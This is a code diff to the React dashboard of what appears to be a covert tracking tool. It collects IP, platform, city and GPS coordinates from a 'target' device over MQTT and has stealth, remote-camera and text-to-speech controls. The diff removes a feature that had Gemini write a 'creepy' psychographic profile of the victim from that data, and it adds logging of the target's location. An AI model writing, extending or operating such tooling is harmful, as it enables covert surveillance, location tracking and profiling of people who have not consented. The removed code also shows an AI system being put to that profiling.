@@ -6,8 +6,7 @@ import QRCodeDisplay from '../components/QRCodeDisplay';
 import HackerMap from '../components/HackerMap';
 import { mqttService } from '../services/mqttService';
 import { TerminalLog, DeviceInfo, StreamMessage } from '../types';
-import { Camera, X, Disc, Video, Ghost, EyeOff, Eye, Brain, Mic, Zap, Send } from 'lucide-react';
-import { GoogleGenAI } from "@google/genai";
+import { Camera, X, Disc, Video, Ghost, EyeOff, Eye, Mic, Zap, Send } from 'lucide-react';
 
 const Dashboard: React.FC = () => {
   const [sessionId] = useState(uuidv4());
@@ -22,7 +21,6 @@ const Dashboard: React.FC = () => {
   const [cameraStream, setCameraStream] = useState<string | null>(null);
   const [isCameraActive, setIsCameraActive] = useState(false);
   const [ttsText, setTtsText] = useState('');
-  const [isGeneratingAI, setIsGeneratingAI] = useState(false);
   
   const audioCtxRef = useRef<AudioContext | null>(null);
 
@@ -35,28 +33,6 @@ const Dashboard: React.FC = () => {
       link
     }]);
   }, []);
-
-  const runAIProfiling = async () => {
-    if (!lastPayload) return;
-    setIsGeneratingAI(true);
-    addLog("SOLICITANDO ANÁLISE PSICOGRÁFICA VIA NEURAL_LINK...", "ai");
-    
-    try {
-      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
-      const prompt = `Analise estes dados de telemetria de um dispositivo alvo e crie um perfil hacker "creepy" e técnico do usuário. Seja conciso, use termos de segurança cibernética. Dados: ${JSON.stringify(lastPayload)}`;
-      
-      const response = await ai.models.generateContent({
-        model: 'gemini-3-flash-preview',
-        contents: prompt,
-      });
-
-      addLog(`RELATÓRIO DE INTELIGÊNCIA: ${response.text}`, "ai");
-    } catch (e) {
-      addLog("ERRO NO PROCESSAMENTO NEURAL", "error");
-    } finally {
-      setIsGeneratingAI(false);
-    }
-  };
 
   const sendTTS = (e?: React.FormEvent) => {
     if (e) e.preventDefault();
@@ -102,7 +78,17 @@ const Dashboard: React.FC = () => {
       (payload: DeviceInfo) => {
         setLastPayload(payload);
         addLog(`TELEMETRIA RECEBIDA: ${payload.ip}`, 'success');
-        if (payload.coords) setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
+        
+        // Detailed log output without AI
+        addLog(`PLATFORMA: ${payload.platform}`, 'info');
+        if (payload.ipGeo) {
+           addLog(`LOCALIZAÇÃO: ${payload.ipGeo.city}, ${payload.ipGeo.country}`, 'info');
+        }
+
+        if (payload.coords) {
+           setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
+           addLog(`COORDENADAS FIXADAS`, 'success');
+        }
       },
       () => {
         setConnected(true);
@@ -139,9 +125,6 @@ const Dashboard: React.FC = () => {
            <div className="flex flex-wrap gap-2">
              <button onClick={() => setIsStealth(!isStealth)} className={`flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border transition-all ${isStealth ? 'bg-blue-900/30 border-blue-500 text-blue-400' : 'bg-gray-800 border-gray-600 text-gray-400'}`}>
                {isStealth ? <EyeOff size={14} /> : <Eye size={14} />} STEALTH
-             </button>
-             <button onClick={runAIProfiling} disabled={!lastPayload || isGeneratingAI} className="flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border bg-purple-900/20 border-purple-600 text-purple-400 disabled:opacity-30">
-               <Brain size={14} className={isGeneratingAI ? 'animate-pulse' : ''} /> IA_PROFILE
              </button>
              <button onClick={toggleCamera} disabled={!connected} className={`flex items-center gap-2 px-3 py-1.5 text-[10px] font-bold border ${isCameraActive ? 'bg-red-900/50 border-red-500 text-red-500 animate-pulse' : 'bg-gray-800 border-gray-600 text-gray-300 disabled:opacity-30'}`}>
                <Camera size={14} /> CAM
